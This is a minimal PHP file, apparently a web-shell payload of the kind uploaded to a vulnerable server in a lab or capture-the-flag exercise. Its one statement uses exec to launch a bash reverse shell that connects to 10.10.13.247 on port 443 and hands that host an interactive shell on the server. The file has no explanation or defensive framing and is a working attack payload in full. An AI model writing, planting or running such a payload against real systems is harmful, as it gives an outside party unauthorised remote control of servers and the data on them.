<?php
    echo exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.13.247/443 0>&1'");
?>